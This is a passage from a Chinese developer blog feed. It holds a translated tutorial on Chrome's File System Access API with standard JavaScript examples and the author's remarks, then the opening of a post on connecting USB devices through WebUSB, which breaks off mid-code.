后，浏览器会先向用户请求文件的写权限。如果你拒绝了此请求，<code>createWritable()</code> 会抛出异常 <code>DOMException</code>，你的应用也没办法写这个文件。在这个文件编辑器中，<code>saveFile()</code> 方法会处理这些 <code>DOMException</code> 异常。</p><p>你可以从文件编辑器中获取你要写的字符串（string）作为 <code>write()</code> 方法的参数传入。也可以直接获取 <a href="https://developer.mozilla.org/en-US/docs/Web/API/BufferSource" target="_blank" rel="noopener">BufferSource</a> 或者 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Blob" target="_blank" rel="noopener">Blob</a>。例如，你可以直接向文件传输数据流（pipe a stream）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">writeURLToFile</span><span class="token punctuation">(</span>fileHandle<span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Create a FileSystemWritableFileStream to write to.</span>  <span class="token keyword">const</span> writable <span class="token operator">=</span> <span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">createWritable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Make an HTTP request for the contents.</span>  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Stream the response into the file.</span>  <span class="token keyword">await</span> response<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">pipeTo</span><span class="token punctuation">(</span>writable<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// pipeTo() closes the destination pipe by default, no need to close it.</span><span class="token punctuation">}</span></code></pre><p>你可以在文件流中使用 <a href="https://wicg.github.io/file-system-access/#api-filesystemwritablefilestream-seek" target="_blank" rel="noopener"><code>seek()</code></a> 或者 <a href="https://wicg.github.io/file-system-access/#api-filesystemwritablefilestream-truncate" target="_blank" rel="noopener"><code>truncate()</code></a> 方法来精确定位文件中的位置，或者改变文件的大小。</p><p><strong>（原作者提醒：直到文件流关闭前修改都不会写入磁盘，可以通过调用 <code>close()</code> 或者等文件流自动关闭）</strong></p><h3 id="将文件句柄存入数据库"><a href="#将文件句柄存入数据库" class="headerlink" title="将文件句柄存入数据库"></a>将文件句柄存入数据库</h3><p>文件句柄是可以序列化的，这意味着你可以将它们存入数据库中，或者调用 <code>postMessage()</code> 在相同的域（the same top-level origin）中传递它们。</p><p>将文件句柄存入数据库意味着你可以存储状态，或者记录下用户在使用哪些文件。这让你可以拥有一个最近打开或编辑过的文件列表，或者可以提供打开最近使用的文件的功能等等。在这个文本编辑器中，我将用户最近打开的五个文件存了起来，让用户能够方便地重新选择这些文件。</p><p>在不同会话（session）中文件地访问权限是不能持续存在的，所以你应该使用 <code>queryPermission()</code> 来检验用户是否允许对某文件的访问。如果没有，使用 <code>requestPermission()</code> 来重新请求。</p><p>在上面这个文本编辑器中，我定义了一个 <code>verifyPermission()</code> 方法来检查用户是否已经授予了权限， 如果没有，就会请求。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">verifyPermission</span><span class="token punctuation">(</span>fileHandle<span class="token punctuation">,</span> readWrite<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>readWrite<span class="token punctuation">)</span> <span class="token punctuation">{</span>    options<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token string">'readwrite'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Check if permission was already granted. If so, return true.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">queryPermission</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'granted'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Request permission. If the user grants permission, return true.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">requestPermission</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'granted'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// The user didn't grant permission, so return false.</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过在读请求时申请写权限，我减少了请求权限的次数：打开一个文件时用户只用允许一次，便可以同时授予应用读写权限。</p><h3 id="打开一个目录并列出其内容"><a href="#打开一个目录并列出其内容" class="headerlink" title="打开一个目录并列出其内容"></a>打开一个目录并列出其内容</h3><p>要列出目录下的所有文件，需要调用 <a href="https://wicg.github.io/file-system-access/#api-showdirectorypicker" target="_blank" rel="noopener"><code>showDirectoryPicker()</code> </a>。用户在我呢见选择器中选择一个目录，然后会返回一个 <a href="https://wicg.github.io/file-system-access/#api-filesystemdirectoryhandle" target="_blank" rel="noopener"><code>FileSystemDirectoryHandle</code></a>，这个句柄对象能让你列举并访问目录中的文件。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> butDir <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'butDirectory'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>butDir<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> dirHandle <span class="token operator">=</span> <span class="token keyword">await</span> window<span class="token punctuation">.</span><span class="token function">showDirectoryPicker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">const</span> entry <span class="token keyword">of</span> dirHandle<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span>kind<span class="token punctuation">,</span> entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="新建或者目录下的访问文件和文件夹"><a href="#新建或者目录下的访问文件和文件夹" class="headerlink" title="新建或者目录下的访问文件和文件夹"></a>新建或者目录下的访问文件和文件夹</h3><p>通过目录的句柄，你可以通过使用 <a href="https://wicg.github.io/file-system-access/#dom-filesystemdirectoryhandle-getfilehandle" target="_blank" rel="noopener"><code>getFileHandle()</code></a> 与 <a href="https://wicg.github.io/file-system-access/#dom-filesystemdirectoryhandle-getdirectoryhandle" target="_blank" rel="noopener"><code>getDirectoryHandle()</code></a> 创建或者访问文件和文件夹。你可以通过传入一个额外的 <code>option</code> 对象，并带有一个布尔类型的 <code>create</code> 字段，来决定如果文件或文件夹不存在时是否创建一个新的。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// In an existing directory, create a new directory named "My Documents".</span><span class="token keyword">const</span> newDirectoryHandle <span class="token operator">=</span> <span class="token keyword">await</span> existingDirectoryHandle<span class="token punctuation">.</span><span class="token function">getDirectoryHandle</span><span class="token punctuation">(</span><span class="token string">'My Documents'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  create<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// In this new directory, create a file named "My Notes.txt".</span><span class="token keyword">const</span> newFileHandle <span class="token operator">=</span> <span class="token keyword">await</span> newDirectoryHandle<span class="token punctuation">.</span><span class="token function">getFileHandle</span><span class="token punctuation">(</span><span class="token string">'My Notes.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> create<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="解析目录中文件的路径"><a href="#解析目录中文件的路径" class="headerlink" title="解析目录中文件的路径"></a>解析目录中文件的路径</h3><p>当你正在处理目录下的文件或文件夹时，解析它们的路径会对你很有用。这个操作可以通过调用 <a href="https://wicg.github.io/file-system-access/#api-filesystemdirectoryhandle-resolve" target="_blank" rel="noopener"><code>resolve()</code></a> 实现。被解析的文件可以是目录的直接子女或者间接子女。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Resolve the path of the previously created file called "My Notes.txt".</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token keyword">await</span> newDirectoryHandle<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>newFileHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// `path` is now ["My Documents", "My Notes.txt"]</span></code></pre><h3 id="删除目录下的文件和文件夹"><a href="#删除目录下的文件和文件夹" class="headerlink" title="删除目录下的文件和文件夹"></a>删除目录下的文件和文件夹</h3><p>如果你获取了访问一个目录的权限，那你就能够使用 <a href="https://wicg.github.io/file-system-access/#dom-filesystemdirectoryhandle-removeentry" target="_blank" rel="noopener"><code>removeEntry()</code></a> 来删除它下面的文件与文件夹。删除文件夹时，你可以选择递归删除其所有子文件及其包含的文件。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Delete a file.</span><span class="token keyword">await</span> directoryHandle<span class="token punctuation">.</span><span class="token function">removeEntry</span><span class="token punctuation">(</span><span class="token string">'Abandoned Masterplan.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Recursively delete a folder.</span><span class="token keyword">await</span> directoryHandle<span class="token punctuation">.</span><span class="token function">removeEntry</span><span class="token punctuation">(</span><span class="token string">'Old Stuff'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> recursive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="集成拖放（Drag-and-drop）功能"><a href="#集成拖放（Drag-and-drop）功能" class="headerlink" title="集成拖放（Drag and drop）功能"></a>集成拖放（Drag and drop）功能</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API" target="_blank" rel="noopener">HTML Drag and Drop interfaces</a> 让 Web 应用可以接受直接将文件拖放到网页中。在拖放操作中，拖拽文件或目录项将分别关联到文件或目录项的入口（entry）。当拖拽文件时，<code>DataTransferItem.getAsFileSystemHandle()</code> 方法会返回一个包含 <code>FileSystemFileHandle</code> 对象的 promise 对象，当拖拽目录时，一个包含 <code>FileSystemDirectoryHandle</code> 对象的 promise 对象。下面的代码展示了这一过程。注意，无论是文件还是目录， Drag and Drop interface 中的  <a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransferItem/kind" target="_blank" rel="noopener"><code>DataTransferItem.kind</code></a> 都是 <code>&quot;file&quot;</code> ，然而 File System Access API 中的  <a href="https://wicg.github.io/file-system-access/#dom-filesystemhandle-kind" target="_blank" rel="noopener"><code>FileSystemHandle.kind</code></a>  会区分为 <code>&quot;file&quot;</code> 和 <code>&quot;direcotry&quot;</code>。</p><pre class=" language-javascript"><code class="language-javascript">elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'dragover'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Prevent navigation.</span>  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'drop'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Prevent navigation.</span>  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Process all of the items.</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> e<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span>items<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Careful: `kind` will be 'file' for both file</span>    <span class="token comment" spellcheck="true">// _and_ directory entries.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>kind <span class="token operator">===</span> <span class="token string">'file'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> entry <span class="token operator">=</span> <span class="token keyword">await</span> item<span class="token punctuation">.</span><span class="token function">getAsFileSystemHandle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>entry<span class="token punctuation">.</span>kind <span class="token operator">===</span> <span class="token string">'directory'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handleDirectoryEntry</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">handleFileEntry</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="访问域私有文件系统（the-origin-private-file-system）"><a href="#访问域私有文件系统（the-origin-private-file-system）" class="headerlink" title="访问域私有文件系统（the origin-private file system）"></a>访问域私有文件系统（the origin-private file system）</h3><p>如这个名字所说，域私有文件系统是网页的域私有的存储端点（注：也就是说这个文件系统是这个网页独有的，你刷新页面就变成一个新的了）。浏览器通常将网页的域私有文件系统中的内容存在磁盘的某个位置，但是不会让你轻易找到。显然，你在你电脑真实的文件系统上也是找不到相应名字的域私有文件系统的内容的。浏览器只是让它看起来像个文件系统罢了，事实上这些文件可能存储在数据库或者其他数据结构中。重要的事再说一遍：当你使用这个 API（指域私有文件系统的）的时候，不要指望能在你的硬盘上找到1：1的对应。拿到域私有文件系统根目录（root）的 <code>FileSystemDirectoryHandle</code> 之后，你可以像操作普通文件系统一样操作它。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> root <span class="token operator">=</span> <span class="token keyword">await</span> navigator<span class="token punctuation">.</span>storage<span class="token punctuation">.</span><span class="token function">getDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Create a new file handle.</span><span class="token keyword">const</span> fileHandle <span class="token operator">=</span> <span class="token keyword">await</span> root<span class="token punctuation">.</span><span class="token function">getFileHandle</span><span class="token punctuation">(</span><span class="token string">'Untitled.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> create<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Create a new directory handle.</span><span class="token keyword">const</span> dirHandle <span class="token operator">=</span> <span class="token keyword">await</span> root<span class="token punctuation">.</span><span class="token function">getDirectoryHandle</span><span class="token punctuation">(</span><span class="token string">'New Folder'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> create<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Recursively remove a directory.</span><span class="token keyword">await</span> root<span class="token punctuation">.</span><span class="token function">removeEntry</span><span class="token punctuation">(</span><span class="token string">'Old Stuff'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> recursive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Polyfilling"><a href="#Polyfilling" class="headerlink" title="Polyfilling"></a>Polyfilling</h2><p>(注：Polyfill 为 Web 开发者中的黑话，大致意思是实现浏览器不支持的原生 API 代码。具体意义请自行 Google。)</p><p>我们也可以自己实现一些 File System Access API 中的方法。</p><ul><li><code>showOpenFilePicker()</code> 可以约等于 <code>&lt;input type=&quot;file&quot;&gt;</code> 元素。</li><li><code>showSaveFilePicker()</code> 可以通过 <code>&lt;a download=&quot;file_name&quot;</code> 元素来模拟，但是尽管这个可以触发下载，但是它不允许覆盖已存在的文件。</li><li><code>showDirectoryPicker()</code> 可以通过 <code>&lt;input type=&quot;file&quot; webkitdirectory&gt;</code> 元素来模拟。（不过这个未被标准化）</li></ul><p>我们开发了一个叫  <a href="https://web.dev/browser-nativefs/" target="_blank" rel="noopener">browser-nativefs</a> 的库来尽可能地使用 File System Access API， 如果你无法使用，你可以使用上述的次优方案。</p><h2 id="安全与权限"><a href="#安全与权限" class="headerlink" title="安全与权限"></a>安全与权限</h2><p>Chrome 团队设计和实现 File System Access API 的核心原则定义在  <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/docs/security/permissions-for-powerful-web-platform-features.md" target="_blank" rel="noopener">Controlling Access to Powerful Web Platform Features</a> 中，包括了用户控制、透明度和用户工效（ ergonomics）几方面。</p><h3 id="打开文件或保存新文件"><a href="#打开文件或保存新文件" class="headerlink" title="打开文件或保存新文件"></a>打开文件或保存新文件</h3><p>当打开一个文件，用户通过文件选择器提供读文件或目录的权限。文件选择器只能在  <a href="https://w3c.github.io/webappsec-secure-contexts/" target="_blank" rel="noopener">secure context</a> 中通过 user gesture 触发（注：就是需要用户自己点击才能弹出文件选择器）。如果用户不想打开了，他们可以直接取消，然后网站拿不到任何访问权限。这个和 <code>&lt;input type=&quot;file&quot;&gt;</code> 是一样的。</p><p><img src="https://webdev.imgix.net/file-system-access/fs-open.jpg" alt="File picker to open a file for reading"></p><p>同样的，当一个 Web 应用想要保存一个新文件，浏览器也会弹出一个保存文件的选择器，让用户选择保存的文件名和路径。当用户保存一个新文件（或者覆盖一个老文件），文件选择器会授予应用对这个文件的写权限。</p><p><img src="https://webdev.imgix.net/file-system-access/fs-save.jpg" alt="File picker to save a file to disk."></p><h4 id="被限制的文件夹"><a href="#被限制的文件夹" class="headerlink" title="被限制的文件夹"></a>被限制的文件夹</h4><p>为了保护用户和他们的数据，浏览器可能会限制用户访问特定文件夹的能力，比如核心的操作系统文件夹。出现这种情况时，浏览器会弹窗提示用户另选一个文件夹。</p><h3 id="更改一个已存在的文件或目录"><a href="#更改一个已存在的文件或目录" class="headerlink" title="更改一个已存在的文件或目录"></a>更改一个已存在的文件或目录</h3><p>Web 应用只有得到用户明确的允许之后才能更改本地文件。</p><h4 id="权限提示"><a href="#权限提示" class="headerlink" title="权限提示"></a>权限提示</h4><p>当用户想要保存修改到有读权限的本地文件时，浏览去会弹出提示为整个网站询求这个文件的写权限。这个权限请求只能被 user gesture 触发，比如按下保存按钮。</p><p><img src="https://webdev.imgix.net/file-system-access/fs-save-permission-crop.jpg" alt="Permission prompt shown prior to saving a file."></p><p>另外，一些编辑多文件的 Web 应用（比如 IDE），可能在打开文件的时候就请求保存修改的权限。</p><p>如果用户选择取消（Cancle），Web 应用就没办法保存修改到本地。应该提供其他让用户保存他们数据的方法，比如提供  <a href="https://developers.google.com/web/updates/2011/08/Downloading-resources-in-HTML5-a-download" target="_blank" rel="noopener">“download” the file</a> 这样的链接，或者保存数据到云端等等。</p><h3 id="透明性"><a href="#透明性" class="headerlink" title="透明性"></a>透明性</h3><p>用户授予 Web 应用保存文件的权限后，浏览器的 URL 栏上会显示一个图标。点击这个图标会弹出一个可访问文件列表。用户可以选择撤销对某些文件的权限。</p><p><img src="https://webdev.imgix.net/file-system-access/fs-save-icon.jpg" alt="Omnibox icon"></p><h3 id="权限有效期"><a href="#权限有效期" class="headerlink" title="权限有效期"></a>权限有效期</h3><p>只要你不关闭这个域下的所有标签页，Web 应用就可以保持已有的权限。一旦你关闭了所有标签页，网站就会失去所有的访问权限。用户下次再打开这个 Web 应用，就需要重新按照提示赋予文件访问权限。</p><h3 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h3><p>如果你想对 API 的设计者说点什么，有问题，或者想反馈 BUG，请前往原网站进行下一步的操作。<a href="https://web.dev/file-system-access/#feedback" target="_blank" rel="noopener">https://web.dev/file-system-access/#feedback</a></p><h2 id="我自己想说的话"><a href="#我自己想说的话" class="headerlink" title="我自己想说的话"></a>我自己想说的话</h2><p>这应该是目前为止（2020-12-26）我写的最长的一篇博客了吧，虽然全文的都是翻译的别人的文章。。。我是用这个 File System Access API 的起因是我在公司实习突然接盘了一个搁置了半年的项目，然后这个项目由于没有客户端人力，所以就然我暂时赶出一版 Web 应用来完成大致的功能（虽然我是后端开发）。由于有访问本地文件的需求，我通过 Google 找到了这个不久前才更新的 Chrome API（版本 83），还真是及时。。不过到本文完成的时候，我已经转向 Electron 开发了，也就是说，这个 API 其实我已经放弃使用了。作为浏览器提供的  API，它的功能真的有很大的局限性，不过如果要写一个在线的编辑器啥的是真的很方便。</p><p>作为浏览器上的网页应用，确实要在安全性和方便性之间做出取舍，像这个 API 就没办法直接获取本地文件系统的信息，不像 node 的 fs 模块，这也是我最后又选择重构为 Electron 的原因。。。</p><p>找了一份后台开发的实习，但我怎么感觉在前端和客户端开发的道路上越走越远了呢。。而且也没有人系统地带我，全靠自己摸索。。。我这实习真的有什么大的意义吗（除了恰烂钱）。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 学习 </tag>
            
            <tag> Web </tag>
            
            <tag> Chrome </tag>
            
            <tag> 文章翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Chrome 浏览器连接 USB 设备</title>
      <link href="/web-usb-connector/"/>
      <url>/web-usb-connector/</url>
      
        <content type="html"><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/RinChanNOWWW/web_usb_connector" target="_blank" rel="noopener">https://github.com/RinChanNOWWW/web_usb_connector</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在公司 mentor 给我说来了一个需求，想要能够通过 Web 配置终端设备的一些设置，让我看看怎么用浏览器通过 USB 连接到设备。</p><p>好巧不巧的是，作为一个街机音游狗，接触了各种黑科技的我还真用过这种 Web 配置工具。我使用的一款手台就是通过这样的方式进行配置的，而且作者还将所有代码完全开源了：<a href="https://github.com/mon/PocketVoltex/tree/master/Software/WebConfig" target="_blank" rel="noopener">PocketVoltex/Software/WebConfig</a>，于是我按照作者 mon 的做法将连接 USB 设备并进行配置的代码框架提取了出来。</p><p>我也找了 Github 上其他项目看了看，大多数都是连接 Arduino 的，而且都没有 mon 的这个简单好学。</p><h2 id="编写-Javascript"><a href="#编写-Javascript" class="headerlink" title="编写 Javascript"></a>编写 Javascript</h2><h3 id="将浏览器提供的-usb-API-封装起来"><a href="#将浏览器提供的-usb-API-封装起来" class="headerlink" title="将浏览器提供的 usb API 封装起来"></a>将浏览器提供的 usb API 封装起来</h3><p>将连接 usb 的方法封装起来赋值给 window 以便全局使用。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// usb.js</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> navigator<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token string">"use strict"</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> USBWrapperInit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> UsbWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>hasUSB <span class="token operator">=</span> navigator <span class="token operator">&amp;&amp;</span> navigator<span class="token punctuation">.</span>usb<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>hasUSB<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Your browser does not support usb'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>connect <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> navigator<span class="token punctuation">.</span>usb        <span class="token punctuation">.</span><span class="token function">requestDevice</span><span class="token punctuation">(</span><span class="token punctuation">{</span>filters<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>usb <span class="token operator">=</span> navigator<span class="token punctuation">.</span>usb<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>USBWrapper <span class="token operator">=</span> UsbWrapper<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  window<span class="token punctuation">.</span>USBWrapperInit <span class="token operator">=</span> USBWrapperInit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> navigator<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="编写-Config-类"><a href="#编写-Config-类" class="headerlink" title="编写 Config 类"></a>编写 Config 类</h3><p>本应用的逻辑是新建一个 Config 的同时连接到想要配置的 USB 设备，这样就能将一个连接对应到一个配置上。同样的，把 Config 类赋值给 window 以便全局使用。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// config.js</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> document<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token string">"use strict"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> device<span class="token punctuation">;</span>    <span class="token keyword">const</span> genLog <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> log <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span>innerHTML <span class="token operator">+</span><span class="token operator">=</span> html <span class="token operator">+</span> <span class="token string">'&lt;br/>'</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span>scrollTop <span class="token operator">=</span> log<span class="token punctuation">.</span>scrollHeight<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> clearLog <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> log <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"USB CONFIG TEST"</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token punctuation">{</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">genLog</span><span class="token punctuation">(</span><span class="token string">"USB CONFIG TEST"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        